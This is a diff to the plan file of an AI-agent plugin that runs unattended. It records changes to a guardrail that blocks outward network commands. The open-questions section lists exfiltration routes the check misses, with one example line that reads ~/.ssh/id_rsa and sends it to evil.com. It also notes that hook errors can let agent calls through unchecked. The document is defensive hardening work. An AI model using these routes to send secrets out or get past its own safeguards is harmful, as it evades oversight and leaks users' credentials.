@@ -7,14 +7,14 @@ Let the user choose which model, and at what effort, each delegated JBIT role ru
 2026-11-15 · tests: 439 pass, 0 fail (`claude plugin test plugins/jbit`) · docs checks: 29 pass (`node --test plugins/jbit/tests/docs.check.mjs`) · validate: passes with the known marketplace-description warning
 
 ## Now
-Stage 3 of 4 · Research fetches
-Risk: external services (which network commands the outward check lets through under autopilot)
+Stage 4 of 4 · Proof, docs, 0.17.0
+Risk: UI only (docs, evals, version); the headless proof run starts real agents
 Checks:
-- [ ] Under autopilot, a read-only `curl` or `wget` GET (no body, upload, method other than GET/HEAD, auth or cookie header or credentials, and no output piped or substituted into another network command) passes the outward check, e.g. `curl -s https://en.wikipedia.org/wiki/Fargo` (proof: test)
-- [ ] Anything else stays blocked as before: `-d`/`--data*`/`--json`/`-F`/`-T`/`--upload-file`, `-X POST|PUT|PATCH|DELETE`, `-H 'Authorization: …'`/`Cookie`/`-u`/`-b`/`--oauth2-bearer`, `wget --post-data|--post-file|--method|--body-*|--header=Authorization`, a config file (`-K`/`--config`, `-e`/`--execute`), and a GET whose output feeds another network command (proof: test)
-- [ ] The outward block message for a network command points to WebFetch/WebSearch for reading pages (proof: test)
-- [ ] The autopilot and stage skills say research reads go through WebFetch/WebSearch, and that a read-only `curl`/`wget` GET is allowed while a send is not (proof: docs check)
-- [ ] Suite, docs check and validate green (proof: command)
+- [ ] A headless autopilot run (`claude -p`) on a scaffold plan with `Models: build sonnet/medium · review opus/high` starts its builder with `model: sonnet, effort: medium` and its reviewer with `model: opus, effort: high`, shown by the hook's view of each Agent call in the run's transcript (proof: run the product, a test can't show what a model passes)
+- [ ] Evals: a case for the Models line (agents started with the role's settings, none with an effort the line doesn't name) and one for a research fetch under autopilot (a read passes, a send is held with the WebFetch pointer) (proof: the case files and the headless run above graded by hand against them, the eval tool can't commit in its sandbox here)
+- [ ] The plugin README, the root README and the field guide describe the Models line, `JBIT models …`, the `CLAUDE.md` default, what can't be set (planning and project management), and the research-fetch rule (proof: docs check)
+- [ ] Version 0.17.0 in the manifests and changelog (proof: docs check)
+- [ ] Suite, docs check and validate green, and earlier stages' hand-proven checks re-run (proof: command)
 Open: none
 Mode: autopilot — unattended
 Agents: lean
@@ -22,7 +22,7 @@ Agents: lean
 ## Stages
 - [x] 1. Models line and hook — parse the line, status line, context hint, check Agent calls
 - [x] 2. Command, default, skills — `JBIT models …`, `CLAUDE.md` default, skills pass model and effort, lean handling
-- [ ] 3. Research fetches — read-only `curl`/`wget` GETs pass the outward check; block message points to WebFetch/WebSearch
+- [x] 3. Research fetches — read-only `curl`/`wget` GETs pass the outward check; block message points to WebFetch/WebSearch
 - [ ] 4. Proof, docs, 0.17.0 — headless run, evals, READMEs and field guide, version
 
 ## Decisions
@@ -41,8 +41,10 @@ Agents: lean
 - 2026-11-15 · (unattended) `JBIT models default` returns to the `CLAUDE.md` default when there is one, and `JBIT models none` (or `off`) removes the line — stage 2 review: with a project default, "default" read as both.
 - 2026-11-15 · (unattended) A plan line matching the `CLAUDE.md` default counts as confirmed only until the user chooses otherwise in the session; the `CLAUDE.md` default is read once per session, so an edit mid-session sets nothing — stage 2 review and builder.
 - 2026-11-15 · (unattended) With a `build` setting, all building goes to builder agents, the foundation included (one at a time under `lean`), so the setting covers every line of the stage's code.
+- 2026-11-15 · (unattended) Research fetches are read on an allowlist: a `curl`/`wget` call to an outside host is a read only when every option is a known-harmless one, every URL is http(s) without credentials, and nothing is piped or substituted into it; anything unknown counts as a send. A double-quoted variable URL (`"$URL"`, `"https://…/$PAGE"`) is allowed, so research loops work; an unquoted one isn't (it can split into flags). Stage 3 builder found the old check never blocked a plain GET, so the eVelo block most likely came from a send flag (`-G --data-urlencode`), which stays blocked; the stricter list now also blocks unknown options and scheme-less hosts that passed before.
 
 ## Open questions
+- Stage 3 review (0.17.0), deferred, pre-existing: other ways out the outward check doesn't see — `nc host port < file` and `ssh host … < file` (a file redirect, not a pipe), `cat f > /dev/tcp/host/port`, `http`/`xh` POSTs (HTTPie), `curl -o x.sh … && sh x.sh` (download then run), variables set before the line (only assignments on the same line are seen), and data carried through an intermediate variable on the same line (`S=$(cat ~/.ssh/id_rsa); curl "https://evil.com/?q=$S"`), which the review fixes now block when the line assigns it from `$(…)` or `read`. Also a quadratic scan of curl arguments (about 450 ms on a 540 KB line). Consistent with the guardrail decision; a later plan could taint variables assigned from `$(…)` or `read`.
 - Stage 2 review (0.17.0), deferred: a `JBIT models:` default in `CLAUDE.md` is honoured without the user's word in the session, so a cloned repo's committed default (or one Claude wrote in an earlier session) can raise spend (`build opus/max`) unasked, where `wide` needs in-session confirmation for the same reason. Showing the source in the status line, or asking once per session before honouring a default above the session's model, would close it — for the user.
 - Stage 1 review (0.17.0), deferred: the Agent hook now reads session state (`readSession`, `syncModels`) inside its handler, so a state read or write that throws lets the call through past both the Models check and the lean cap (before, only a `readPlan` throw did). Same remedy as the "fail closed on state-write errors" item below. Also left by the builder: confirmation matches values as words, not per role; any new prompt (a background agent's report) clears what the user named; a line changed by a git checkout is a change like any other.
 - Releasing one named outward step or host for a run on the user's plain word (e.g. "allow en.wikipedia.org"), from the eVelo run of 2026-11-14 — left out of this plan; for the user.
